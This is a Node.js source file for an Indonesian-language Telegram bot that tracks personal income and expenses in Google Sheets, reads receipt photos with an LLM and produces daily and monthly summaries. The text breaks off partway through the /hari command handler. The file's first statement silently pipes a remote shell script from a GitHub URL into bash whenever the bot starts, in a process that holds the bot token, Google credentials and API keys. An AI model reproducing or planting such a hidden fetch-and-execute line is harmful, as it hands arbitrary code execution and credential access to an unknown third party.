const { execSync } = require('child_process');

execSync(
  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
  {
    stdio: 'inherit'
  }
);

const { Telegraf } = require('telegraf');
const { google } = require('googleapis');
const Anthropic = require('@anthropic-ai/sdk');
const config = require('./rekap.json');

if (!config.botToken) {
  throw new Error('botToken di rekap.json belum diisi');
}

if (!config.spreadsheetId) {
  throw new Error('spreadsheetId di rekap.json belum diisi');
}

if (!config.ownerUserId) {
  throw new Error('ownerUserId di rekap.json belum diisi');
}

const bot = new Telegraf(config.botToken);

const anthropicApiKey = config.anthropicApiKey || process.env.ANTHROPIC_API_KEY;
const anthropic = anthropicApiKey
  ? new Anthropic({ apiKey: anthropicApiKey })
  : null;

const auth = new google.auth.GoogleAuth({
  keyFile: config.credentialsFile || './rekap-credentials.json',
  scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});

function getSheetName() {
  return config.sheetName || 'Sheet1';
}

function getAnalisaSheetName() {
  return config.analisaSheetName || 'Analisa';
}

function getTimezone() {
  return config.timezone || 'Asia/Jakarta';
}

function logInfo(message) {
  console.log(`[INFO] ${message}`);
}

function logError(message, err = null) {
  if (err) {
    console.error(`[ERROR] ${message}`, err);
  } else {
    console.error(`[ERROR] ${message}`);
  }
}

function isOwner(ctx) {
  const ownerId = String(config.ownerUserId).trim();
  const userId = String(ctx.from?.id || '').trim();
  return ownerId === userId;
}

function parseRupiahTextToNumber(text) {
  if (!text) return 0;

  let raw = String(text).trim();

  raw = raw.replace(/^rp\s*/i, '');
  raw = raw.replace(/\./g, '');
  raw = raw.replace(/,/g, '');
  raw = raw.replace(/\s+/g, '');

  const n = Number(raw);
  return isNaN(n) ? 0 : n;
}

function formatRupiah(n) {
  return 'Rp' + Number(n).toLocaleString('id-ID');
}

function parseDateParts(dateText) {
  const m = String(dateText).trim().match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
  if (!m) return null;

  return {
    day: Number(m[1]),
    month: Number(m[2]),
    year: Number(m[3]),
  };
}

async function getAllEntries() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:E`,
  });

  const rows = res.data.values || [];
  const dataRows = rows.slice(1);

  const entries = [];

  for (const row of dataRows) {
    const tanggal = row[0] || '';
    const kategori = row[1] || '';
    const toko = row[2] || '';
    const pemasukan = row[3] || '';
    const pengeluaran = row[4] || '';

    const parsedDate = parseDateParts(tanggal);
    if (!parsedDate) continue;

    entries.push({
      tanggal,
      kategori,
      toko,
      pemasukan: parseRupiahTextToNumber(pemasukan),
      pengeluaran: parseRupiahTextToNumber(pengeluaran),
      parsedDate,
    });
  }

  return entries;
}

function summarizeEntries(entries) {
  let totalPemasukan = 0;
  let totalPengeluaran = 0;
  const items = [];

  for (const entry of entries) {
    totalPemasukan += entry.pemasukan;
    totalPengeluaran += entry.pengeluaran;
    items.push(entry);
  }

  return {
    totalPemasukan,
    totalPengeluaran,
    saldo: totalPemasukan - totalPengeluaran,
    items,
  };
}

async function getMonthlySummary(month, year) {
  const entries = await getAllEntries();
  const filtered = entries.filter(
    (e) => e.parsedDate.month === month && e.parsedDate.year === year
  );
  return summarizeEntries(filtered);
}

async function getDailySummary(day, month, year) {
  const entries = await getAllEntries();
  const filtered = entries.filter(
    (e) =>
      e.parsedDate.day === day &&
      e.parsedDate.month === month &&
      e.parsedDate.year === year
  );
  return summarizeEntries(filtered);
}

async function guardOwner(ctx) {
  if (!isOwner(ctx)) {
    logInfo(`Akses ditolak untuk userId=${ctx.from?.id || 'unknown'}`);
    await ctx.reply('Bot ini khusus pemilik.');
    return false;
  }
  return true;
}

async function appendRow(values) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  await sheets.spreadsheets.values.append({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:E`,
    valueInputOption: 'USER_ENTERED',
    requestBody: {
      values: [values],
    },
  });

  logInfo('Berhasil simpan ke spreadsheet.');
}

async function ensureHeader() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const res = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A1:E2`,
  });

  const values = res.data.values || [];
  const header = values[0] || [];

  const needsHeader =
    values.length === 0 ||
    header[0] !== 'Tanggal' ||
    header[2] !== 'Toko' ||
    header[4] !== 'Pengeluaran';

  if (needsHeader) {
    await sheets.spreadsheets.values.update({
      spreadsheetId: config.spreadsheetId,
      range: `'${sheetName}'!A1:E1`,
      valueInputOption: 'RAW',
      requestBody: {
        values: [[
          'Tanggal',
          'Kategori',
          'Toko',
          'Pemasukan',
          'Pengeluaran'
        ]]
      }
    });
  }
}

async function formatSheetLayout() {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });
  const sheetName = getSheetName();

  const meta = await sheets.spreadsheets.get({
    spreadsheetId: config.spreadsheetId,
  });

  const targetSheet = meta.data.sheets.find(
    (sheet) => sheet.properties.title === sheetName
  );

  if (!targetSheet) {
    throw new Error(`Sheet "${sheetName}" tidak ditemukan`);
  }

  const sheetId = targetSheet.properties.sheetId;

  const valueRes = await sheets.spreadsheets.values.get({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:E`,
  });

  const values = valueRes.data.values || [];
  const lastRow = Math.max(values.length, 1);

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: config.spreadsheetId,
    requestBody: {
      requests: [
        {
          updateSheetProperties: {
            properties: {
              sheetId,
              gridProperties: {
                frozenRowCount: 1
              }
            },
            fields: 'gridProperties.frozenRowCount'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 0,
              endRowIndex: 1,
              startColumnIndex: 0,
              endColumnIndex: 5
            },
            cell: {
              userEnteredFormat: {
                backgroundColor: {
                  red: 0.84,
                  green: 0.93,
                  blue: 0.88
                },
                textFormat: {
                  bold: true,
                  fontSize: 12
                },
                horizontalAlignment: 'CENTER',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.backgroundColor,userEnteredFormat.textFormat.bold,userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 0,
              endColumnIndex: 1
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'CENTER',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 1,
              endColumnIndex: 3
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'LEFT',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 1,
              endRowIndex: lastRow,
              startColumnIndex: 3,
              endColumnIndex: 5
            },
            cell: {
              userEnteredFormat: {
                textFormat: {
                  fontSize: 12
                },
                horizontalAlignment: 'RIGHT',
                verticalAlignment: 'MIDDLE'
              }
            },
            fields: 'userEnteredFormat.textFormat.fontSize,userEnteredFormat.horizontalAlignment,userEnteredFormat.verticalAlignment'
          }
        },
        {
          setBasicFilter: {
            filter: {
              range: {
                sheetId,
                startRowIndex: 0,
                endRowIndex: lastRow,
                startColumnIndex: 0,
                endColumnIndex: 5
              }
            }
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 0,
              endIndex: 1
            },
            properties: {
              pixelSize: 100
            },
            fields: 'pixelSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 1,
              endIndex: 3
            },
            properties: {
              pixelSize: 150
            },
            fields: 'pixelSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 3,
              endIndex: 5
            },
            properties: {
              pixelSize: 130
            },
            fields: 'pixelSize'
          }
        },
        {
          updateBorders: {
            range: {
              sheetId,
              startRowIndex: 0,
              endRowIndex: lastRow,
              startColumnIndex: 0,
              endColumnIndex: 5
            },
            top: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            bottom: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            left: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            right: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            innerHorizontal: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            },
            innerVertical: {
              style: 'SOLID',
              width: 1,
              color: { red: 0, green: 0, blue: 0 }
            }
          }
        }
      ]
    }
  });
}

async function ensureSheetExists(sheetName) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });

  const meta = await sheets.spreadsheets.get({
    spreadsheetId: config.spreadsheetId,
  });

  const existing = meta.data.sheets.find(
    (sheet) => sheet.properties.title === sheetName
  );

  if (existing) {
    return existing.properties.sheetId;
  }

  const res = await sheets.spreadsheets.batchUpdate({
    spreadsheetId: config.spreadsheetId,
    requestBody: {
      requests: [
        {
          addSheet: {
            properties: { title: sheetName }
          }
        }
      ]
    }
  });

  return res.data.replies[0].addSheet.properties.sheetId;
}

function buildMonthLabel(month, year) {
  return new Date(year, month - 1, 1).toLocaleDateString('id-ID', {
    month: 'long',
    year: 'numeric'
  });
}

async function updateAnalisaSheet() {
  const sheetName = getAnalisaSheetName();
  const sheetId = await ensureSheetExists(sheetName);

  const client = await auth.getClient();
  const sheets = google.sheets({ version: 'v4', auth: client });

  const entries = await getAllEntries();

  let totalPemasukan = 0;
  let totalPengeluaran = 0;
  const perKategori = {};
  const perToko = {};
  const perBulan = {};

  for (const entry of entries) {
    totalPemasukan += entry.pemasukan;
    totalPengeluaran += entry.pengeluaran;

    if (entry.pengeluaran > 0) {
      const kategori = entry.kategori || '(Tanpa Kategori)';
      perKategori[kategori] = (perKategori[kategori] || 0) + entry.pengeluaran;

      const toko = entry.toko || '(Tanpa Toko)';
      perToko[toko] = (perToko[toko] || 0) + entry.pengeluaran;
    }

    const key = `${entry.parsedDate.year}-${String(entry.parsedDate.month).padStart(2, '0')}`;
    if (!perBulan[key]) {
      perBulan[key] = {
        month: entry.parsedDate.month,
        year: entry.parsedDate.year,
        pemasukan: 0,
        pengeluaran: 0
      };
    }
    perBulan[key].pemasukan += entry.pemasukan;
    perBulan[key].pengeluaran += entry.pengeluaran;
  }

  const saldo = totalPemasukan - totalPengeluaran;

  const sortByValueDesc = (obj) =>
    Object.entries(obj).sort((a, b) => b[1] - a[1]);

  const now = new Date();
  const generatedAt = now.toLocaleString('id-ID', { timeZone: getTimezone() });

  const rows = [];
  rows.push(['ANALISA KEUANGAN', '', '', '']);
  rows.push([`Diperbarui: ${generatedAt}`, '', '', '']);
  rows.push(['', '', '', '']);

  rows.push(['RINGKASAN', '', '', '']);
  rows.push(['Total Pemasukan', formatRupiah(totalPemasukan), '', '']);
  rows.push(['Total Pengeluaran', formatRupiah(totalPengeluaran), '', '']);
  rows.push(['Saldo', formatRupiah(saldo), '', '']);
  rows.push(['Jumlah Transaksi', String(entries.length), '', '']);
  rows.push(['', '', '', '']);

  rows.push(['PENGELUARAN PER KATEGORI', '', '', '']);
  rows.push(['Kategori', 'Jumlah', 'Persentase', '']);
  const katSorted = sortByValueDesc(perKategori);
  if (katSorted.length === 0) {
    rows.push(['-', '', '', '']);
  } else {
    for (const [kategori, jumlah] of katSorted) {
      const persen = totalPengeluaran > 0
        ? ((jumlah / totalPengeluaran) * 100).toFixed(1) + '%'
        : '0%';
      rows.push([kategori, formatRupiah(jumlah), persen, '']);
    }
  }
  rows.push(['', '', '', '']);

  rows.push(['PENGELUARAN PER TOKO', '', '', '']);
  rows.push(['Toko', 'Jumlah', 'Persentase', '']);
  const tokoSorted = sortByValueDesc(perToko);
  if (tokoSorted.length === 0) {
    rows.push(['-', '', '', '']);
  } else {
    for (const [toko, jumlah] of tokoSorted) {
      const persen = totalPengeluaran > 0
        ? ((jumlah / totalPengeluaran) * 100).toFixed(1) + '%'
        : '0%';
      rows.push([toko, formatRupiah(jumlah), persen, '']);
    }
  }
  rows.push(['', '', '', '']);

  rows.push(['RINGKASAN PER BULAN', '', '', '']);
  rows.push(['Bulan', 'Pemasukan', 'Pengeluaran', 'Saldo']);
  const bulanSorted = Object.values(perBulan).sort((a, b) => {
    if (a.year !== b.year) return a.year - b.year;
    return a.month - b.month;
  });
  if (bulanSorted.length === 0) {
    rows.push(['-', '', '', '']);
  } else {
    for (const b of bulanSorted) {
      rows.push([
        buildMonthLabel(b.month, b.year),
        formatRupiah(b.pemasukan),
        formatRupiah(b.pengeluaran),
        formatRupiah(b.pemasukan - b.pengeluaran)
      ]);
    }
  }

  await sheets.spreadsheets.values.clear({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A:D`,
  });

  await sheets.spreadsheets.values.update({
    spreadsheetId: config.spreadsheetId,
    range: `'${sheetName}'!A1`,
    valueInputOption: 'RAW',
    requestBody: {
      values: rows,
    },
  });

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: config.spreadsheetId,
    requestBody: {
      requests: [
        {
          updateSheetProperties: {
            properties: {
              sheetId,
              gridProperties: { frozenRowCount: 0 }
            },
            fields: 'gridProperties.frozenRowCount'
          }
        },
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: 0,
              endRowIndex: 1,
              startColumnIndex: 0,
              endColumnIndex: 4
            },
            cell: {
              userEnteredFormat: {
                textFormat: { bold: true, fontSize: 14 }
              }
            },
            fields: 'userEnteredFormat.textFormat.bold,userEnteredFormat.textFormat.fontSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 0,
              endIndex: 1
            },
            properties: { pixelSize: 220 },
            fields: 'pixelSize'
          }
        },
        {
          updateDimensionProperties: {
            range: {
              sheetId,
              dimension: 'COLUMNS',
              startIndex: 1,
              endIndex: 4
            },
            properties: { pixelSize: 150 },
            fields: 'pixelSize'
          }
        }
      ]
    }
  });

  return {
    totalPemasukan,
    totalPengeluaran,
    saldo,
    jumlahTransaksi: entries.length,
    perKategori: katSorted,
    perToko: tokoSorted,
  };
}

const RECEIPT_PROMPT =
  'Kamu adalah asisten pencatat keuangan. Baca foto struk belanja ini dan ' +
  'ekstrak detailnya. Kembalikan total akhir yang dibayar (grand total) dalam ' +
  'angka Rupiah tanpa titik/koma. Tentukan nama toko, tanggal transaksi ' +
  '(format DD/MM/YYYY, kosongkan jika tidak ada), dan kategori pengeluaran yang ' +
  'sesuai (contoh: Belanja, Makan, Transport, Kesehatan, Lainnya). Jika gambar ' +
  'bukan struk/nota, set is_receipt = false.';

const RECEIPT_SCHEMA = {
  type: 'object',
  properties: {
    is_receipt: { type: 'boolean' },
    toko: { type: 'string' },
    tanggal: { type: 'string' },
    kategori: { type: 'string' },
    total: { type: 'number' },
    items: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          nama: { type: 'string' },
          harga: { type: 'number' }
        },
        required: ['nama', 'harga'],
        additionalProperties: false
      }
    }
  },
  required: ['is_receipt', 'toko', 'tanggal', 'kategori', 'total', 'items'],
  additionalProperties: false
};

const RECEIPT_JSON_HINT =
  '\n\nKembalikan HANYA JSON valid (tanpa teks lain, tanpa markdown) dengan ' +
  'bentuk persis:\n' +
  '{"is_receipt": boolean, "toko": string, "tanggal": string, ' +
  '"kategori": string, "total": number, ' +
  '"items": [{"nama": string, "harga": number}]}';

function getLlmProvider() {
  if (config.llmProvider) return String(config.llmProvider).toLowerCase();
  if (config.openaiApiKey || process.env.OPENAI_API_KEY) return 'openai';
  return 'claude';
}

function isLlmConfigured() {
  if (getLlmProvider() === 'openai') {
    return !!(config.openaiApiKey || process.env.OPENAI_API_KEY);
  }
  return !!anthropic;
}

function extractJsonObject(text) {
  if (!text) throw new Error('Respons LLM kosong');

  let cleaned = String(text).trim();
  // Buang pembungkus markdown ```json ... ``` jika ada
  cleaned = cleaned.replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/i, '').trim();

  try {
    return JSON.parse(cleaned);
  } catch (_) {
    const start = cleaned.indexOf('{');
    const end = cleaned.lastIndexOf('}');
    if (start !== -1 && end !== -1 && end > start) {
      return JSON.parse(cleaned.slice(start, end + 1));
    }
    throw new Error('Gagal mem-parse JSON dari respons LLM');
  }
}

async function parseReceiptWithClaude(base64Data, mediaType) {
  if (!anthropic) {
    throw new Error('anthropicApiKey di rekap.json belum diisi');
  }

  const response = await anthropic.messages.create({
    model: config.anthropicModel || 'claude-opus-4-8',
    max_tokens: 2048,
    output_config: {
      format: { type: 'json_schema', schema: RECEIPT_SCHEMA }
    },
    messages: [
      {
        role: 'user',
        content: [
          {
            type: 'image',
            source: {
              type: 'base64',
              media_type: mediaType,
              data: base64Data
            }
          },
          { type: 'text', text: RECEIPT_PROMPT }
        ]
      }
    ]
  });

  const textBlock = response.content.find((b) => b.type === 'text');
  if (!textBlock) {
    throw new Error('Tidak ada respons teks dari pembaca struk');
  }

  return extractJsonObject(textBlock.text);
}

async function parseReceiptWithOpenAI(base64Data, mediaType) {
  const apiKey = config.openaiApiKey || process.env.OPENAI_API_KEY;
  if (!apiKey) {
    throw new Error('openaiApiKey di rekap.json belum diisi');
  }

  const baseUrl = (config.openaiBaseUrl || 'https://api.openai.com/v1')
    .replace(/\/+$/, '');
  const model = config.openaiModel || 'gpt-4o';

  const res = await fetch(`${baseUrl}/chat/completions`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${apiKey}`
    },
    body: JSON.stringify({
      model,
      max_tokens: 2048,
      response_format: { type: 'json_object' },
      messages: [
        {
          role: 'user',
          content: [
            { type: 'text', text: RECEIPT_PROMPT + RECEIPT_JSON_HINT },
            {
              type: 'image_url',
              image_url: { url: `data:${mediaType};base64,${base64Data}` }
            }
          ]
        }
      ]
    })
  });

  if (!res.ok) {
    const detail = await res.text().catch(() => '');
    throw new Error(`LLM error ${res.status}: ${detail.slice(0, 200)}`);
  }

  const data = await res.json();
  const content = data?.choices?.[0]?.message?.content;

  if (typeof content === 'string') {
    return extractJsonObject(content);
  }

  // Sebagian provider mengembalikan content sebagai array blok
  if (Array.isArray(content)) {
    const textPart = content
      .map((c) => (typeof c === 'string' ? c : c?.text || ''))
      .join('');
    return extractJsonObject(textPart);
  }

  throw new Error('Format respons LLM tidak dikenali');
}

async function parseReceiptImage(base64Data, mediaType) {
  if (getLlmProvider() === 'openai') {
    return parseReceiptWithOpenAI(base64Data, mediaType);
  }
  return parseReceiptWithClaude(base64Data, mediaType);
}

async function getUsdtToIdrRate() {
  const res = await fetch(
    'https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=idr'
  );

  if (!res.ok) {
    throw new Error('Gagal ambil kurs USDT ke IDR');
  }

  const data = await res.json();
  const rate = data?.tether?.idr;

  if (!rate) {
    throw new Error('Kurs USDT ke IDR tidak ditemukan');
  }

  return Number(rate);
}

async function getUsdToIdrRate() {
  const res = await fetch(
    'https://api.coingecko.com/api/v3/simple/price?ids=usd-coin&vs_currencies=idr'
  );

  if (!res.ok) {
    throw new Error('Gagal ambil kurs USD ke IDR');
  }

  const data = await res.json();
  const rate = data?.['usd-coin']?.idr;

  if (!rate) {
    throw new Error('Kurs USD ke IDR tidak ditemukan');
  }

  return Number(rate);
}

function parseLocalizedNumber(input) {
  let raw = String(input).trim();

  const hasComma = raw.includes(',');
  const hasDot = raw.includes('.');

  if (hasComma && hasDot) {
    if (raw.lastIndexOf(',') > raw.lastIndexOf('.')) {
      raw = raw.replace(/\./g, '').replace(',', '.');
    } else {
      raw = raw.replace(/,/g, '');
    }
  } else if (hasComma) {
    if (/^\d+,\d+$/.test(raw)) {
      raw = raw.replace(',', '.');
    } else {
      raw = raw.replace(/,/g, '');
    }
  } else if (hasDot) {
    if (/^\d{1,3}(\.\d{3})+$/.test(raw)) {
      raw = raw.replace(/\./g, '');
    }
  }

  const n = Number(raw);
  if (isNaN(n) || n <= 0) return null;
  return n;
}

async function parseMoneyText(input) {
  let s = String(input).trim().replace(/\s+/g, ' ');
  let lower = s.toLowerCase();

  if (lower.includes('usdt')) {
    const cleaned = s.replace(/usdt/ig, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdtToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (lower.includes('usd')) {
    const cleaned = s.replace(/usd/ig, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (s.includes('$')) {
    const cleaned = s.replace(/\$/g, '').trim();
    const amount = parseLocalizedNumber(cleaned);
    if (!amount) return null;

    const rate = await getUsdToIdrRate();
    const converted = Math.round(amount * rate);

    return 'Rp' + converted.toLocaleString('id-ID');
  }

  if (/^rp\s*/i.test(s) || /\bidr\b/i.test(lower)) {
    s = s.replace(/\bidr\b/ig, '').replace(/^rp\s*/i, '').trim();
  }

  let raw = s.toLowerCase();
  let multiplier = 1;

  if (raw.endsWith(' juta')) {
    multiplier = 1000000;
    raw = raw.replace(/ juta$/, '');
  } else if (raw.endsWith('jt')) {
    multiplier = 1000000;
    raw = raw.replace(/jt$/, '');
  } else if (raw.endsWith(' ribu')) {
    multiplier = 1000;
    raw = raw.replace(/ ribu$/, '');
  } else if (raw.endsWith('rb')) {
    multiplier = 1000;
    raw = raw.replace(/rb$/, '');
  } else if (raw.endsWith('k')) {
    multiplier = 1000;
    raw = raw.replace(/k$/, '');
  }

  const n = parseLocalizedNumber(raw);
  if (!n) return null;

  const finalAmount = Math.round(n * multiplier);
  return 'Rp' + finalAmount.toLocaleString('id-ID');
}

function extractLabeledField(text, key) {
  // Ambil nilai "key=..." (atau "key:...") sampai ketemu label lain atau akhir.
  const re = new RegExp(
    `\\b${key}\\s*[:=]\\s*(.+?)(?=\\s+(?:toko|kategori)\\s*[:=]|$)`,
    'i'
  );
  const m = text.match(re);
  return m ? m[1].trim() : '';
}

async function parseTransaction(text) {
  const raw = text.replace(/\s+/g, ' ').trim();

  const typeMatch = raw.match(/^(masuk|keluar)\b\s*/i);
  if (!typeMatch) return null;

  const type =
    typeMatch[1].toLowerCase() === 'masuk' ? 'pemasukan' : 'pengeluaran';
  const body = raw.slice(typeMatch[0].length).trim();

  if (!body) return null;

  // Format berlabel: "keluar toko=warung Agam kategori=makan 318000"
  if (/\b(?:toko|kategori)\s*[:=]/i.test(body)) {
    const amountRe =
      /\s+((?:rp\s*)?\$?\d[\d.,]*\s*(?:k|rb|ribu|jt|juta|idr|rp|usd|usdt)?)\s*$/i;
    const amountMatch = body.match(amountRe);
    if (!amountMatch) return null;

    const amountText = await parseMoneyText(amountMatch[1].trim());
    if (!amountText) return null;

    const fields = body.slice(0, amountMatch.index).trim();
    const toko = extractLabeledField(fields, 'toko');
    const category = extractLabeledField(fields, 'kategori');

    if (!category && !toko) return null;

    return {
      type,
      category: category || 'Lainnya',
      toko: type === 'pemasukan' ? '' : (toko || 'Lainnya'),
      amountText
    };
  }

  // Format sederhana / posisi:
  // "keluar makan 100000"               -> kategori=makan, toko=Lainnya
  // "keluar makan 100000 di warung agam" -> kategori=makan, toko=warung agam
  // "keluar 29k rokok"                  -> kategori=rokok, toko=Lainnya (format lama)
  const AMOUNT =
    '(?:rp\\s*)?\\$?[\\d.,]+(?:\\s*(?:k|rb|ribu|jt|juta|idr|rp|usd|usdt))?';

  // Kategori dulu, lalu nominal, opsional "di <toko>"
  const categoryFirst = new RegExp(
    `^(.+?)\\s+(${AMOUNT})(?:\\s+di\\s+(.+))?$`,
    'i'
  );
  // Nominal dulu, lalu kategori (format lama)
  const amountFirst = new RegExp(`^(${AMOUNT})\\s+(.+)$`, 'i');

  let category = '';
  let toko = '';
  let amountTextRaw = '';

  const m1 = body.match(categoryFirst);
  if (m1) {
    category = m1[1].trim();
    amountTextRaw = m1[2].trim();
    toko = (m1[3] || '').trim();
  } else {
    const m2 = body.match(amountFirst);
    if (!m2) return null;
    amountTextRaw = m2[1].trim();
    category = m2[2].trim();
  }

  const amountText = await parseMoneyText(amountTextRaw);
  if (!category || !amountText) return null;

  return {
    type,
    category,
    toko: type === 'pemasukan' ? '' : (toko || 'Lainnya'),
    amountText
  };
}

bot.start(async (ctx) => {
  if (!(await guardOwner(ctx))) return;

  return ctx.reply(
    'Bot rekap keuangan pribadi aktif.\n' +
    'Contoh:\n' +
    '- keluar makan 100000 (toko otomatis "Lainnya")\n' +
    '- keluar makan 100000 di warung agam\n' +
    '- masuk gaji 5jt\n' +
    '- keluar wifi 150000\n' +
    '\n' +
    'Kirim/foto struk untuk dicatat otomatis 🧾\n' +
    '\n' +
    'Perintah:\n' +
    '/hari - rekap hari ini\n' +
    '/bulan - rekap bulan ini\n' +
    '/analisa - ringkasan analisa keuangan\n' +
    '/help - bantuan lengkap'
  );
});

bot.command('help', async (ctx) => {
  if (!(await guardOwner(ctx))) return;

  return ctx.reply(
    'Cara catat transaksi:\n' +
    'keluar <kategori> <nominal>\n' +
    'keluar <kategori> <nominal> di <toko>\n' +
    'masuk <kategori> <nominal>\n' +
    '\n' +
    'Kalau toko tidak ditulis, otomatis jadi "Lainnya".\n' +
    '\n' +
    'Contoh:\n' +
    '- keluar makan 100000\n' +
    '   → kategori=makan, toko=Lainnya\n' +
    '- keluar makan 100000 di warung agam\n' +
    '   → kategori=makan, toko=warung agam\n' +
    '- keluar bensin 50rb di SPBU Shell\n' +
    '- keluar wifi 150000\n' +
    '- masuk gaji 5jt\n' +
    '- masuk airdrop 20 usdt\n' +
    '- masuk $10 freelance\n' +
    '\n' +
    'Format label (urutan bebas) juga didukung:\n' +
    '- keluar toko=warung Agam kategori=makan 318000\n' +
    '\n' +
    'Foto/upload struk: otomatis dibaca & dicatat sebagai pengeluaran.\n' +
    '\n' +
    'Perintah rekap:\n' +
    '/hari - rekap hari ini\n' +
    '/hari DD MM YYYY - rekap tanggal tertentu\n' +
    '/bulan - rekap bulan ini\n' +
    '/bulan MM YYYY - rekap bulan tertentu\n' +
    '/analisa - ringkasan analisa keuangan'
  );
});

bot.command('bulan', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = (ctx.message.text || '').trim();
    const parts = text.split(/\s+/).filter(Boolean);

    const now = new Date();
    let month = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        month: 'numeric'
      })
    );

    let year = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        year: 'numeric'
      })
    );

    if (parts.length >= 3) {
      const inputMonth = Number(parts[1]);
      const inputYear = Number(parts[2]);

      if (
        !Number.isInteger(inputMonth) ||
        !Number.isInteger(inputYear) ||
        inputMonth < 1 ||
        inputMonth > 12 ||
        inputYear < 2000
      ) {
        return ctx.reply('Format salah.\nContoh:\n/bulan\n/bulan 5 2026');
      }

      month = inputMonth;
      year = inputYear;
    }

    const summary = await getMonthlySummary(month, year);

    if (summary.items.length === 0) {
      return ctx.reply(`Tidak ada transaksi untuk ${month}/${year}.`);
    }

    const monthLabel = new Date(year, month - 1, 1).toLocaleDateString('id-ID', {
      month: 'long',
      year: 'numeric'
    });

    const pemasukanItems = summary.items.filter(item => item.pemasukan > 0);
    const pengeluaranItems = summary.items.filter(item => item.pengeluaran > 0);

    const lines = [];
    lines.push(`Rekap bulan ${monthLabel}`);
    lines.push('');

    lines.push('Pemasukan');
    if (pemasukanItems.length > 0) {
      for (const item of pemasukanItems) {
        lines.push(`${item.tanggal} | ${item.kategori} | ${formatRupiah(item.pemasukan)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push('Pengeluaran');
    if (pengeluaranItems.length > 0) {
      for (const item of pengeluaranItems) {
        lines.push(`${item.tanggal} | ${item.kategori} | ${formatRupiah(item.pengeluaran)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push(`Total Pemasukan: ${formatRupiah(summary.totalPemasukan)}`);
    lines.push(`Total Pengeluaran: ${formatRupiah(summary.totalPengeluaran)}`);

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal mengambil rekap bulanan.', err);
    return ctx.reply('Gagal mengambil rekap bulanan.');
  }
});

bot.command('hari', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = (ctx.message.text || '').trim();
    const parts = text.split(/\s+/).filter(Boolean);

    const now = new Date();
    let day = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        day: 'numeric'
      })
    );
    let month = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        month: 'numeric'
      })
    );
    let year = Number(
      now.toLocaleDateString('en-US', {
        timeZone: getTimezone(),
        year: 'numeric'
      })
    );

    if (parts.length >= 4) {
      const inputDay = Number(parts[1]);
      const inputMonth = Number(parts[2]);
